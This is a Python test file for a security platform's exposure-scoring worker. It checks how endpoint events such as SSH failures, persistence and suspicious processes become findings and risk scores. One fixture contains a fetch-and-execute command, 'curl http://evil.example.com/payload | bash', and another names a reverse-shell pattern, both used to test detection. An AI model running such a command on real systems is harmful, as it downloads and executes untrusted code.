"""Pure-logic tests for the exposure worker and projection engine.

No database is required - all tests operate on in-memory data structures.
"""

from __future__ import annotations

import os
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import MagicMock

os.environ.setdefault("SEAGULL_DB_URL", "postgresql://seagull:test@127.0.0.1:5432/seagull_test")

from app.features.exposure.domain.constants import (
    RC_ACTIVE_ALERT,
    RC_BRUTE_FORCE_ACTIVITY,
    RC_LATERAL_MOVEMENT_SIGNAL,
    RC_PERSISTENCE_SIGNAL,
    RC_SENSITIVE_FILE_CHANGE,
    RC_SUSPICIOUS_PROCESS,
)
from app.features.exposure.domain.normalization import make_finding_key, normalize_asset_key
from app.features.exposure.domain.scoring import ScoringInputs, compute_risk_score
from app.features.exposure.worker_runtime import (
    AgentRecord,
    AlertSignals,
    ChainSummary,
    EventSignals,
    VulnSignals,
    build_event_findings_from_signals,
    clear_history_cache,
    mark_history_written,
    project_event_signals,
    should_write_score_history,
)
from app.workers import exposure as exposure_worker

_UTC = timezone.utc


def _now() -> datetime:
    return datetime.now(_UTC)


# normalize_asset_key


def test_asset_key_prefers_agent_id():
    key = normalize_asset_key("agent-123", ip="10.0.0.1", hostname="host1")
    assert key == "agent:agent-123"


def test_asset_key_falls_back_to_ip():
    key = normalize_asset_key(None, ip="10.0.0.1", hostname="host1")
    assert key == "ip:10.0.0.1"


def test_asset_key_falls_back_to_hostname():
    key = normalize_asset_key(None, hostname="myhost")
    assert key == "host:myhost"


def test_asset_key_idempotent():
    k1 = normalize_asset_key("abc", hostname="h")
    k2 = normalize_asset_key("abc", hostname="h")
    assert k1 == k2


# project_event_signals — classification


def test_project_ssh_fail_event():
    ev = {
        "id": 1,
        "agent_id": "agent-1",
        "event_type": "ssh_auth",
        "extra": {"action": "failed"},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.ssh_fail_count == 1
    assert sig.agent_id == "agent-1"


def test_project_ssh_accept_event_ignored():
    ev = {
        "id": 2,
        "agent_id": "agent-1",
        "event_type": "ssh_auth",
        "extra": {"action": "accepted"},
    }
    sig = project_event_signals(ev)
    assert sig is None


def test_project_fim_security_file():
    ev = {
        "id": 3,
        "agent_id": "agent-2",
        "event_type": "fim_change",
        "extra": {"path_category": "auth_file"},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.fim_count == 1


def test_project_fim_non_security_ignored():
    ev = {
        "id": 4,
        "agent_id": "agent-2",
        "event_type": "fim_change",
        "extra": {"path_category": "log_file"},
    }
    sig = project_event_signals(ev)
    assert sig is None


def test_project_persistence_systemd():
    ev = {
        "id": 5,
        "agent_id": "agent-3",
        "event_type": "persistence_systemd",
        "extra": {},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.persistence_count == 1


def test_project_persistence_cron():
    ev = {
        "id": 6,
        "agent_id": "agent-3",
        "event_type": "persistence_cron",
        "extra": {},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.persistence_count == 1


def test_project_suspicious_exec_curl():
    ev = {
        "id": 7,
        "agent_id": "agent-4",
        "event_type": "proc_exec",
        "extra": {"cmdline": "curl http://evil.example.com/payload | bash"},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.suspicious_proc_count == 1


def test_project_exec_pattern_reverse_shell():
    ev = {
        "id": 8,
        "agent_id": "agent-4",
        "event_type": "proc_exec",
        "extra": {"cmdline": "ls /home", "exec_patterns": ["exec_reverse_shell"]},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.suspicious_proc_count == 1


def test_project_exec_benign_ignored():
    ev = {
        "id": 9,
        "agent_id": "agent-4",
        "event_type": "proc_exec",
        "extra": {"cmdline": "ls -la /tmp", "exec_patterns": []},
    }
    sig = project_event_signals(ev)
    assert sig is None


def test_project_lateral_movement_high_confidence():
    ev = {
        "id": 10,
        "agent_id": "agent-5",
        "event_type": "beacon_suspect",
        "extra": {"confidence": 80},
    }
    sig = project_event_signals(ev)
    assert sig is not None
    assert sig.lateral_movement_count == 1


def test_project_lateral_movement_low_confidence_ignored():
    ev = {
        "id": 11,
        "agent_id": "agent-5",
        "event_type": "beacon_suspect",
        "extra": {"confidence": 30},
    }
    sig = project_event_signals(ev)
    assert sig is None


def test_project_irrelevant_event_type():
    ev = {
        "id": 12,
        "agent_id": "agent-1",
        "event_type": "netflow",
        "extra": {},
    }
    sig = project_event_signals(ev)
    assert sig is None


def test_project_missing_agent_id():
    ev = {
        "id": 13,
        "agent_id": "",
        "event_type": "persistence_cron",
        "extra": {},
    }
    sig = project_event_signals(ev)
    assert sig is None


# build_event_findings_from_signals


def test_build_fim_finding():
    sig = EventSignals(agent_id="agent-1", fim_count=1)
    now = _now()
    findings = build_event_findings_from_signals(sig, asset_key="agent:agent-1", now=now)
    assert any(f.finding_type == "fim" for f in findings)
    assert any(RC_SENSITIVE_FILE_CHANGE in f.reason_codes for f in findings)


def test_build_persistence_finding():
    sig = EventSignals(agent_id="agent-1", persistence_count=1)
    now = _now()
    findings = build_event_findings_from_signals(sig, asset_key="agent:agent-1", now=now)
    assert any(RC_PERSISTENCE_SIGNAL in f.reason_codes for f in findings)


def test_build_suspicious_proc_finding():
    sig = EventSignals(agent_id="agent-1", suspicious_proc_count=1)
    now = _now()
    findings = build_event_findings_from_signals(sig, asset_key="agent:agent-1", now=now)
    assert any(f.finding_type == "process_exec" for f in findings)
    assert any(RC_SUSPICIOUS_PROCESS in f.reason_codes for f in findings)


def test_build_lateral_movement_finding():
    sig = EventSignals(agent_id="agent-1", lateral_movement_count=1)
    now = _now()
    findings = build_event_findings_from_signals(sig, asset_key="agent:agent-1", now=now)
    assert any(RC_LATERAL_MOVEMENT_SIGNAL in f.reason_codes for f in findings)


def test_build_ssh_bruteforce_finding():
    sig = EventSignals(agent_id="agent-1", ssh_fail_count=7)
    now = _now()
    findings = build_event_findings_from_signals(sig, asset_key="agent:agent-1", now=now)
    assert any(f.finding_type == "event" for f in findings)
    assert any(RC_BRUTE_FORCE_ACTIVITY in f.reason_codes for f in findings)


def test_no_signals_produces_no_findings():
    sig = EventSignals(agent_id="agent-1")
    now = _now()
    findings = build_event_findings_from_signals(sig, asset_key="agent:agent-1", now=now)
    assert findings == []


# Upsert idempotency via finding_key stability


def test_finding_key_idempotent_same_source():
    k1 = make_finding_key("vulnerability", "agent:abc", "vuln-99")
    k2 = make_finding_key("vulnerability", "agent:abc", "vuln-99")
    assert k1 == k2


def test_finding_key_different_for_different_source():
    k1 = make_finding_key("vulnerability", "agent:abc", "vuln-99")
    k2 = make_finding_key("vulnerability", "agent:abc", "vuln-100")
    assert k1 != k2


def test_event_finding_key_stable_on_repeat():
    sig = EventSignals(agent_id="agent-42", fim_count=1)
    now = _now()
    findings_a = build_event_findings_from_signals(sig, asset_key="agent:agent-42", now=now)
    findings_b = build_event_findings_from_signals(sig, asset_key="agent:agent-42", now=now)
    keys_a = {f.finding_key for f in findings_a}
    keys_b = {f.finding_key for f in findings_b}
    assert keys_a == keys_b


# Vulnerability signal projection → score


def test_critical_vulns_drive_high_score():
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="high",
        critical_vuln_count=3,
    )
    score, _, _, reason_codes = compute_risk_score(inputs)
    assert score > 20
    assert "critical_cve" in reason_codes
    assert "vulnerable_package" in reason_codes


def test_exploitability_signal_adds_score():
    baseline = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="high",
        high_vuln_count=1,
        has_exploitability_signal=False,
    )
    with_exploit = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="high",
        high_vuln_count=1,
        has_exploitability_signal=True,
    )
    score_base, _, _, _ = compute_risk_score(baseline)
    score_exploit, _, _, _ = compute_risk_score(with_exploit)
    assert score_exploit > score_base


def test_no_vulns_gives_low_vuln_component():
    from app.features.exposure.domain.scoring import compute_vulnerability_score
    inputs = ScoringInputs(
        asset_key="agent:x", agent_id="x",
        asset_last_seen_at=_now(), asset_criticality="low",
    )
    assert compute_vulnerability_score(inputs) == 0


# Alert signal projection → reason codes


def test_brute_force_alert_reason_code():
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="medium",
        brute_force_count=2,
    )
    _, _, _, reason_codes = compute_risk_score(inputs)
    assert RC_BRUTE_FORCE_ACTIVITY in reason_codes


def test_lateral_movement_alert_reason_code():
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="medium",
        lateral_movement_count=1,
    )
    _, _, _, reason_codes = compute_risk_score(inputs)
    assert RC_LATERAL_MOVEMENT_SIGNAL in reason_codes


def test_active_alert_reason_code():
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="medium",
        active_alert_count=3,
    )
    _, _, _, reason_codes = compute_risk_score(inputs)
    assert RC_ACTIVE_ALERT in reason_codes


# Attack-chain projection


def test_attack_chain_score_contribution():
    # Open attack chain should raise the overall score versus a clean baseline
    baseline = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="critical",
        open_attack_chain_count=0,
        max_attack_chain_score=0,
    )
    with_chain = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="critical",
        open_attack_chain_count=1,
        max_attack_chain_score=80,
    )
    score_base, _, _, rc_base = compute_risk_score(baseline)
    score_chain, _, _, rc_chain = compute_risk_score(with_chain)
    assert score_chain > score_base
    assert "attack_chain_progression" in rc_chain
    assert "attack_chain_progression" not in rc_base


def test_no_open_chains_zero_chain_component():
    from app.features.exposure.domain.scoring import compute_attack_chain_score
    inputs = ScoringInputs(
        asset_key="agent:x", agent_id="x",
        asset_last_seen_at=_now(), asset_criticality="low",
        open_attack_chain_count=0, max_attack_chain_score=90,
    )
    assert compute_attack_chain_score(inputs) == 0


# Stale agent / inventory penalties


def test_stale_agent_adds_reason_code():
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id=None,  # no agent_id → stale agent signal
        asset_last_seen_at=_now(),
        asset_criticality="low",
    )
    _, _, _, reason_codes = compute_risk_score(inputs)
    assert "stale_agent" in reason_codes


def test_very_old_last_seen_adds_reliability_penalty():
    from app.features.exposure.domain.scoring import compute_reliability_penalty
    old_dt = _now() - timedelta(days=60)
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=old_dt,
        asset_criticality="low",
    )
    penalty = compute_reliability_penalty(inputs)
    assert penalty > 0


def test_fresh_agent_no_stale_reason_codes():
    inputs = ScoringInputs(
        asset_key="agent:x",
        agent_id="x",
        asset_last_seen_at=_now(),
        asset_criticality="low",
    )
    _, _, _, reason_codes = compute_risk_score(inputs)
    assert "stale_agent" not in reason_codes
    assert "stale_inventory" not in reason_codes


# Score history write throttling


def test_score_history_written_when_cache_empty():
    clear_history_cache()
    mock_db = MagicMock()
    mock_db.execute.return_value.scalar.return_value = None

    now = _now()
    result = should_write_score_history(mock_db, asset_key="agent:new", now=now, min_interval_seconds=3600)
    assert result is True


def test_score_history_not_written_within_interval():
    clear_history_cache()
    asset_key = "agent:throttle-test"
    now = _now()
    mark_history_written(asset_key, now)

    mock_db = MagicMock()
    result = should_write_score_history(
        mock_db,
        asset_key=asset_key,
        now=now + timedelta(seconds=60),
        min_interval_seconds=3600,
    )
    assert result is False
    # DB should not have been queried since cache hit
    mock_db.execute.assert_not_called()


def test_score_history_written_after_interval():
    clear_history_cache()
    asset_key = "agent:throttle-test-2"
    old_ts = _now() - timedelta(seconds=7200)
    mark_history_written(asset_key, old_ts)

    mock_db = MagicMock()
    now = _now()
    result = should_write_score_history(mock_db, asset_key=asset_key, now=now, min_interval_seconds=3600)
    assert result is True


def test_mark_history_written_updates_cache():
    clear_history_cache()
    asset_key = "agent:mark-test"
    now = _now()
    mark_history_written(asset_key, now)

    mock_db = MagicMock()
    # Immediately after marking, should not write again
    result = should_write_score_history(mock_db, asset_key=asset_key, now=now, min_interval_seconds=3600)
    assert result is False


# No duplicate nodes/edges for repeated calls (key stability)


def test_event_findings_no_duplicates_on_repeat():
    """Same signals should produce findings with identical keys (idempotent upserts)."""
    sig = EventSignals(agent_id="agent-dupe", fim_count=1, persistence_count=1)
    now = _now()
    run1 = build_event_findings_from_signals(sig, asset_key="agent:agent-dupe", now=now)
    run2 = build_event_findings_from_signals(sig, asset_key="agent:agent-dupe", now=now)

    keys1 = [f.finding_key for f in run1]
    keys2 = [f.finding_key for f in run2]
    assert keys1 == keys2
    # No duplicate keys within a single run
    assert len(keys1) == len(set(keys1))


def test_asset_key_normalization_consistent_across_runs():
    """Asset key must be stable for the same agent across multiple projection cycles."""
    aids = ["agent-alpha", "agent-beta", "agent-gamma"]
    for aid in aids:
        k1 = normalize_asset_key(aid)
        k2 = normalize_asset_key(aid)
        assert k1 == k2


def test_worker_refresh_upserts_are_idempotent(monkeypatch):
    stores = {
        "nodes": {},
        "edges": {},
        "findings": {},
        "history": [],
    }

    monkeypatch.setattr(
        exposure_worker,
        "load_inventory_data",
        lambda db, aid: SimpleNamespace(
            hostname="host-1",
            collected_at=_now(),
            open_ports=[22],
            packages=[{"name": "openssl", "version": "3.0.0"}],
            ip_addresses=["10.0.0.9"],
            packages_count=1,
        ),
    )
    monkeypatch.setattr(exposure_worker, "load_vuln_signals", lambda *args, **kwargs: VulnSignals())
    monkeypatch.setattr(exposure_worker, "load_alert_signals", lambda *args, **kwargs: AlertSignals())
    monkeypatch.setattr(exposure_worker, "load_chain_summary", lambda *args, **kwargs: ChainSummary())
    monkeypatch.setattr(exposure_worker, "load_investigation_context", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "load_investigation_evidence_refs", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "load_response_action_context", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "load_recent_event_rows", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "extract_vulnerable_pkg_names", lambda *args, **kwargs: frozenset({"openssl"}))
    monkeypatch.setattr(exposure_worker, "build_cve_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_alert_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_attack_chain_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_investigation_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_response_action_nodes_and_edges", lambda *args, **kwargs: ([], [], []))
    monkeypatch.setattr(exposure_worker, "build_alert_findings", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "build_attack_chain_findings", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "should_write_score_history", lambda *args, **kwargs: False)
    monkeypatch.setattr(exposure_worker, "sync_asset_graph", lambda *args, **kwargs: None)
    monkeypatch.setattr(exposure_worker, "resolve_inactive_findings", lambda *args, **kwargs: None)

    def _fake_posture(*args, **kwargs):
        return SimpleNamespace(
            risk_score=62,
            severity="high",
            confidence=71,
            score_breakdown={},
        )

    monkeypatch.setattr(exposure_worker.exposure_service, "compute_and_upsert_posture", _fake_posture)
    monkeypatch.setattr(
        exposure_worker.exposure_service,
        "upsert_node",
        lambda db, node: stores["nodes"].setdefault(node.node_key, node),
    )
    monkeypatch.setattr(
        exposure_worker.exposure_service,
        "upsert_edge",
        lambda db, edge: stores["edges"].setdefault(edge.edge_key, edge),
    )
    monkeypatch.setattr(
        exposure_worker.exposure_service,
        "upsert_finding",
        lambda db, finding: stores["findings"].setdefault(finding.finding_key, finding),
    )
    monkeypatch.setattr(
        exposure_worker.exposure_service,
        "record_score_history",
        lambda db, **kwargs: stores["history"].append(kwargs),
    )

    db = MagicMock()
    agent = AgentRecord(
        agent_id="agent-1",
        display_name="host-1",
        last_seen_at=_now(),
        criticality="high",
        is_revoked=False,
    )

    exposure_worker._refresh_agent_posture(db, agent, now=_now())
    counts_after_first = {key: len(value) for key, value in stores.items() if isinstance(value, dict)}
    exposure_worker._refresh_agent_posture(db, agent, now=_now())
    counts_after_second = {key: len(value) for key, value in stores.items() if isinstance(value, dict)}

    assert counts_after_first == counts_after_second
    assert counts_after_second["nodes"] >= 1
    assert counts_after_second["edges"] >= 1


def test_worker_marks_stale_agent_and_inventory_in_scoring(monkeypatch):
    captured = {}

    monkeypatch.setattr(
        exposure_worker,
        "load_inventory_data",
        lambda db, aid: SimpleNamespace(
            hostname="host-1",
            collected_at=_now() - timedelta(days=3),
            open_ports=[],
            packages=[],
            ip_addresses=[],
            packages_count=0,
        ),
    )
    monkeypatch.setattr(exposure_worker, "load_vuln_signals", lambda *args, **kwargs: VulnSignals())
    monkeypatch.setattr(exposure_worker, "load_alert_signals", lambda *args, **kwargs: AlertSignals())
    monkeypatch.setattr(exposure_worker, "load_chain_summary", lambda *args, **kwargs: ChainSummary())
    monkeypatch.setattr(exposure_worker, "load_investigation_context", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "load_investigation_evidence_refs", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "load_response_action_context", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "load_recent_event_rows", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "extract_vulnerable_pkg_names", lambda *args, **kwargs: frozenset())
    monkeypatch.setattr(exposure_worker, "build_cve_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_alert_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_attack_chain_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_package_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_investigation_nodes_and_edges", lambda *args, **kwargs: ([], []))
    monkeypatch.setattr(exposure_worker, "build_response_action_nodes_and_edges", lambda *args, **kwargs: ([], [], []))
    monkeypatch.setattr(exposure_worker, "build_alert_findings", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "build_attack_chain_findings", lambda *args, **kwargs: [])
    monkeypatch.setattr(exposure_worker, "should_write_score_history", lambda *args, **kwargs: False)
    monkeypatch.setattr(exposure_worker, "sync_asset_graph", lambda *args, **kwargs: None)
    monkeypatch.setattr(exposure_worker, "resolve_inactive_findings", lambda *args, **kwargs: None)

    def _capture_posture(*args, **kwargs):
        captured["scoring_inputs"] = kwargs["scoring_inputs"]
        return SimpleNamespace(risk_score=10, severity="low", confidence=60, score_breakdown={})

    monkeypatch.setattr(exposure_worker.exposure_service, "compute_and_upsert_posture", _capture_posture)
    monkeypatch.setattr(exposure_worker.exposure_service, "upsert_node", lambda *args, **kwargs: None)
    monkeypatch.setattr(exposure_worker.exposure_service, "upsert_edge", lambda *args, **kwargs: None)
    monkeypatch.setattr(exposure_worker.exposure_service, "upsert_finding", lambda *args, **kwargs: None)

    agent = AgentRecord(
        agent_id="agent-1",
        display_name="host-1",
        last_seen_at=_now() - timedelta(hours=3),
        criticality="high",
        is_revoked=False,
    )

    exposure_worker._refresh_agent_posture(MagicMock(), agent, now=_now())
    assert captured["scoring_inputs"].stale_agent is True
    assert captured["scoring_inputs"].stale_inventory is True
